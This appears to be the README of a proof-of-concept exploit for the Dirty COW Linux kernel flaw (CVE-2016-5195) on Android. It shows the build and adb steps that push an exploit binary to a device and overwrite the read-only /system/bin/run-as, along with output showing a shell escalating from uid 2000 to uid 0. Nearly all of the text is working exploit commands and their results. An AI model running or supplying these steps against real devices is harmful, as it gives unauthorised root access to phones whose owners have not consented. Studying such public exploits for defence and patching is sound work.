# CVE-2016-5195
CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android

```
$ make root
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk
make[1]: Entering directory `./CVE-2016-5195'
[armeabi] Install        : dirtycow => libs/armeabi/dirtycow
[armeabi] Install        : run-as => libs/armeabi/run-as
make[1]: Leaving directory `./CVE-2016-5195'
adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
[100%] /data/local/tmp/dirtycow
adb push libs/armeabi/run-as /data/local/tmp/run-as
[100%] /data/local/tmp/run-as
adb shell 'chmod 777 /data/local/tmp/run-as'
adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
warning: new file size (9464) and file old size (17944) differ

size 17944


[*] mmap 0xb51e5000
[*] exploit (patch)
[*] currently 0xb51e5000=464c457f
[*] madvise = 0xb51e5000 17944
[*] madvise = 0 1048576
[*] /proc/self/mem 1635778560 1048576
[*] exploited 0xb51e5000=464c457f
adb shell /system/bin/run-as
running as uid 2000
uid 0
```
